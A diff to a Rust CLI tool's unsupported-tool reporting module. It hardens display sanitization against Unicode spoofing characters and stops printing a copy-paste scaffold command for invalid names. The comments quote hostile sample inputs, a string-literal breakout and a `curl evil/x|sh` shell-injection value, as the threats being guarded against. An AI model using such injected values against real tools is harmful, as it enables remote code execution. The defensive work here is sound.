@@ -27,7 +27,7 @@ use serde::Serialize;
 
 use crate::error_codes;
 use crate::meta::REPO_SLUG;
-use crate::net::url_encode::encode_unreserved;
+use crate::net::url_encode::encode_unreserved_into;
 use crate::tools::spec;
 
 /// Issue template filename — must match the file in
@@ -35,10 +35,10 @@ use crate::tools::spec;
 /// breaks the pre-filled URL.
 const TEMPLATE_FILE: &str = "tool_request.yml";
 
-/// Maximum tool-name length accepted by `validate_tool_name`. 64 is
-/// enough for every real tool in the registry and short enough to
-/// keep telemetry attributes / log lines from blowing up.
-pub const MAX_TOOL_NAME_LEN: usize = 64;
+/// Maximum tool-name length accepted by [`validate_tool_name`]. Re-
+/// exported from the shared `jarvy-templates` crate so existing
+/// `tools::unsupported::MAX_TOOL_NAME_LEN` call sites keep working.
+pub use jarvy_templates::MAX_TOOL_NAME_LEN;
 
 /// How a request is being delivered to maintainers.
 ///
@@ -114,13 +114,20 @@ pub struct UnsupportedToolReport {
 /// telemetry attributes. `validate_tool_name` is the stricter check that
 /// rejects names entirely; this function accepts any input but renders
 /// it safely.
+///
+/// Allocation note: `sanitize_for_display` returns `Cow::Borrowed` for
+/// clean input, so the common case allocates only when ownership is
+/// required (the report struct owns its strings for `Serialize`).
+/// `cow_into_string` keeps the borrowed-fast-path zero-allocation
+/// contract honest — `Cow::into_owned` always allocates regardless of
+/// variant, which would defeat the sanitizer's Cow design.
 pub fn build_report(
     tool: &str,
     version: Option<&str>,
     channel: RequestChannel,
 ) -> UnsupportedToolReport {
-    let safe_tool = sanitize_for_display(tool).into_owned();
-    let safe_version = version.map(|v| sanitize_for_display(v).into_owned());
+    let safe_tool = cow_into_string(sanitize_for_display(tool));
+    let safe_version = version.map(|v| cow_into_string(sanitize_for_display(v)));
     UnsupportedToolReport {
         kind: "unsupported_tool",
         suggestions: fuzzy_suggest(&safe_tool, 3),
@@ -136,43 +143,24 @@ pub fn build_report(
     }
 }
 
-/// Strict validation for tool names that flow into source-code
-/// scaffolding or external commands. Returns `Ok` only for the
-/// conservative shape `[A-Za-z0-9._-]{1,64}`.
-///
-/// Used to gate paths where an unvalidated name would be a real
-/// injection risk: the `scaffold_snippet` output is advertised as
-/// paste-into-Rust-source, and an attacker-chosen name like
-/// `foo"); std::process::exit(0); ("` would break out of the
-/// embedded string literal when pasted.
-pub fn validate_tool_name(name: &str) -> Result<(), &'static str> {
-    if name.is_empty() {
-        return Err("tool name must not be empty");
-    }
-    if name.len() > MAX_TOOL_NAME_LEN {
-        return Err("tool name too long (max 64 bytes)");
-    }
-    if !name
-        .bytes()
-        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
-    {
-        return Err("tool name must match [A-Za-z0-9._-]");
-    }
-    Ok(())
-}
+/// Strict validation for tool names — re-exported from
+/// `jarvy-templates`. See that crate's docs for the full rule set.
+/// The shared implementation guarantees `jarvy tools --request` and
+/// `cargo-jarvy new-tool` apply identical gates.
+pub use jarvy_templates::validate_tool_name;
 
 /// Sanitize a user-supplied string for safe display on stderr and in
-/// structured log fields. Strips C0/C1 control bytes (which would let
-/// a malicious `jarvy.toml` inject ANSI escapes and spoof Jarvy's
-/// output) and length-caps the result.
+/// structured log fields. Strips C0/C1 control bytes AND Unicode
+/// spoofing characters (bidi overrides, zero-width characters, line
+/// separators) which would let a malicious `jarvy.toml` clear the
+/// terminal, forge fake Jarvy output, or render `g\u200bit` as `git`.
+/// Length-caps the result so a 4KB attacker name can't blow up log
+/// budgets.
 ///
 /// Returns `Cow::Borrowed` when the input is already clean — the
 /// common case allocates zero.
 pub fn sanitize_for_display(input: &str) -> Cow<'_, str> {
-    let needs_strip = input.len() > MAX_TOOL_NAME_LEN
-        || input
-            .chars()
-            .any(|c| c.is_control() || (c as u32) >= 0x7F && (c as u32) < 0xA0);
+    let needs_strip = input.len() > MAX_TOOL_NAME_LEN || input.chars().any(is_unsafe_for_display);
     if !needs_strip {
         return Cow::Borrowed(input);
     }
@@ -182,13 +170,42 @@ pub fn sanitize_for_display(input: &str) -> Cow<'_, str> {
             out.push('…');
             break;
         }
-        if c.is_control() || ((c as u32) >= 0x7F && (c as u32) < 0xA0) {
+        if is_unsafe_for_display(c) {
             out.push('?');
         } else {
             out.push(c);
         }
     }
     Cow::Owned(out)
+}
+
+/// Predicate for [`sanitize_for_display`]. Single source of truth for
+/// what counts as unsafe — used by both the detection probe (does any
+/// char need stripping?) and the per-char replacement loop. Sharing
+/// the predicate guarantees the two stay aligned.
+///
+/// Unsafe classes:
+/// - `Cc` (Unicode control category): C0 (U+0000-U+001F) and C1
+///   (U+0080-U+009F). Covers ANSI escapes (U+001B), null bytes, CR/LF.
+/// - Line / paragraph separators (U+2028 / U+2029): treated as record
+///   terminators by some log consumers — let an attacker forge multi-
+///   line log entries.
+/// - Zero-width characters and LRM/RLM (U+200B-U+200F): let an
+///   attacker render `g\u200bit` as visual `git` but a distinct
+///   identifier — classic homograph attack.
+/// - Bidi embedding / override controls (U+202A-U+202E, U+2066-U+2069):
+///   render `\u202Etxt.exe` as `exe.txt` (RTL override) — the source
+///   of the famous "Trojan Source" CVE.
+/// - Interlinear annotation anchors (U+FFF9-U+FFFB): obscure but in
+///   the same family.
+fn is_unsafe_for_display(c: char) -> bool {
+    let u = c as u32;
+    c.is_control()
+        || matches!(u, 0x2028 | 0x2029)
+        || matches!(u, 0x200B..=0x200F)
+        || matches!(u, 0x202A..=0x202E)
+        || matches!(u, 0x2066..=0x2069)
+        || matches!(u, 0xFFF9..=0xFFFB)
 }
 
 /// Return up to `limit` closest registered tool names to `query`.
@@ -255,21 +272,26 @@ pub fn fuzzy_suggest(query: &str, limit: usize) -> Vec<String> {
 /// - `tool_name` — auto-populates the first input
 /// - `use_case` — pre-filled when `version` is provided
 pub fn issue_url(tool: &str, version: Option<&str>) -> String {
-    let mut url = String::with_capacity(192);
+    // Single growing buffer — each encoded segment writes straight in
+    // via `encode_unreserved_into`, eliminating the throwaway String
+    // allocations the old `encode_unreserved(&format!(...))` form
+    // produced (two per segment: one for `format!`, one for the
+    // encoder's return).
+    let mut url = String::with_capacity(256);
     url.push_str("https://github.com/");
     url.push_str(REPO_SLUG);
     url.push_str("/issues/new?template=");
     url.push_str(TEMPLATE_FILE);
     url.push_str("&labels=tool-request,needs-triage&title=");
-    url.push_str(&encode_unreserved(&format!("[Tool]: {}", tool)));
+    encode_unreserved_into(&mut url, "[Tool]: ");
+    encode_unreserved_into(&mut url, tool);
     url.push_str("&tool_name=");
-    url.push_str(&encode_unreserved(tool));
+    encode_unreserved_into(&mut url, tool);
     if let Some(v) = version {
         url.push_str("&use_case=");
-        url.push_str(&encode_unreserved(&format!(
-            "Requested version: {} (auto-filed by `jarvy setup`).",
-            v
-        )));
+        encode_unreserved_into(&mut url, "Requested version: ");
+        encode_unreserved_into(&mut url, v);
+        encode_unreserved_into(&mut url, " (auto-filed by `jarvy setup`).");
     }
     url
 }
@@ -283,7 +305,15 @@ pub fn issue_url(tool: &str, version: Option<&str>) -> String {
 /// the only remaining channel when telemetry is off.
 pub fn to_human(report: &UnsupportedToolReport, channel: RequestChannel, seamless: bool) -> String {
     use std::fmt::Write as _;
-    let mut out = String::with_capacity(384);
+    // Capacity hint depends on which branch fires — the Manual branch
+    // appends a ~200-byte URL plus the "please file" + "enable
+    // telemetry" lines, totalling ~620 bytes. Branching the hint
+    // avoids 1-2 reallocs on the telemetry-off path.
+    let cap = match channel {
+        RequestChannel::Manual => 768,
+        _ => 384,
+    };
+    let mut out = String::with_capacity(cap);
     let _ = writeln!(
         out,
         "[jarvy] tool `{}` is not in the Jarvy registry.",
@@ -317,9 +347,23 @@ pub fn to_human(report: &UnsupportedToolReport, channel: RequestChannel, seamles
             }
         }
     }
-    out.push_str("        Scaffold locally: ");
-    out.push_str(&report.scaffold_cmd);
-    out.push('\n');
+    // Only emit the "Scaffold locally" copy-paste line for names that
+    // pass strict validation. `sanitize_for_display` strips control
+    // bytes but leaves shell metacharacters intact, so an attacker
+    // `[provisioner]` key like `foo;curl evil/x|sh` would otherwise
+    // render as a copy-pasteable shell-injection invitation.
+    // Defense-in-depth: the user still gets the error message and the
+    // GitHub URL; they just don't get a pre-built `cargo` command for
+    // an obviously malformed name.
+    if validate_tool_name(&report.tool).is_ok() {
+        out.push_str("        Scaffold locally: ");
+        out.push_str(&report.scaffold_cmd);
+        out.push('\n');
+    } else {
+        out.push_str(
+            "        (Scaffold command suppressed — tool name contains unsafe characters.)\n",
+        );
+    }
     out
 }
 
@@ -345,6 +389,17 @@ pub fn scaffold_snippet(tool: &str) -> String {
 }
 
 // --- internal helpers ----------------------------------------------------
+
+/// Convert a `Cow<'_, str>` to `String` without re-allocating when the
+/// variant is already `Owned`. Identical to `Cow::into_owned` for the
+/// `Borrowed` arm but avoids the latter's behavior of always cloning
+/// — see [`build_report`] for the perf context.
+fn cow_into_string(cow: Cow<'_, str>) -> String {
+    match cow {
+        Cow::Owned(s) => s,
+        Cow::Borrowed(s) => s.to_string(),
+    }
+}
 
 /// Levenshtein distance between two ASCII-lowercased strings.
 /// Two-row implementation; caller passes scratch vectors so the
@@ -420,10 +475,58 @@ mod tests {
     }
 
     #[test]
-    fn sanitize_for_display_caps_length() {
+    fn sanitize_for_display_strips_zero_width_homoglyph() {
+        // U+200B (ZERO WIDTH SPACE) embedded in "git" renders visually
+        // as `git` but is a distinct identifier — classic homoglyph
+        // attack. Must be stripped.
+        let s = sanitize_for_display("g\u{200B}it");
+        assert!(matches!(s, Cow::Owned(_)));
+        assert!(!s.contains('\u{200B}'), "zero-width survived: {:?}", s);
+    }
+
+    #[test]
+    fn sanitize_for_display_strips_rtl_override() {
+        // U+202E (RIGHT-TO-LEFT OVERRIDE) is the "Trojan Source" CVE
+        // building block. Renders `\u202Etxt.exe` as `exe.txt`.
+        let s = sanitize_for_display("a\u{202E}b");
+        assert!(matches!(s, Cow::Owned(_)));
+        assert!(!s.contains('\u{202E}'));
+    }
+
+    #[test]
+    fn sanitize_for_display_strips_line_separator() {
+        // U+2028 (LINE SEPARATOR) can forge multi-line log entries in
+        // consumers that treat it as a record terminator.
+        let s = sanitize_for_display("a\u{2028}b");
+        assert!(matches!(s, Cow::Owned(_)));
+        assert!(!s.contains('\u{2028}'));
+    }
+
+    #[test]
+    fn sanitize_for_display_caps_length_exact() {
         let long = "a".repeat(200);
         let s = sanitize_for_display(&long);
-        assert!(s.len() <= MAX_TOOL_NAME_LEN + 4); // +4 for the trailing "…"
+        // The loop breaks `if out.len() >= MAX_TOOL_NAME_LEN` and then
+        // pushes '…' (3 bytes in UTF-8). Exact: cap + 3.
+        assert_eq!(
+            s.len(),
+            MAX_TOOL_NAME_LEN + '…'.len_utf8(),
+            "length-cap math: {}",
+            s.len()
+        );
+        // The trailing character must be the ellipsis code-point itself
+        // — guards against a regression that pushes `..." or 4 bytes.
+        assert!(s.ends_with('…'), "tail: {:?}", s);
+    }
+
+    #[test]
+    fn sanitize_for_display_exact_max_len_is_borrowed() {
+        // Input exactly at the max — boundary check ensures the
+        // detection probe doesn't trigger a needless allocation.
+        let exact = "a".repeat(MAX_TOOL_NAME_LEN);
+        let s = sanitize_for_display(&exact);
+        assert!(matches!(s, Cow::Borrowed(_)));
+        assert_eq!(s.len(), MAX_TOOL_NAME_LEN);
     }
 
     #[test]
@@ -443,7 +546,7 @@ mod tests {
         assert!(url.contains("tool_name=kubectl"));
         assert!(url.contains("title=%5BTool%5D%3A%20kubectl"));
         assert!(url.contains("use_case="));
-        assert!(url.contains("bearbinary/Jarvy"));
+        assert!(url.contains("bearbinary/jarvy"));
     }
 
     #[test]
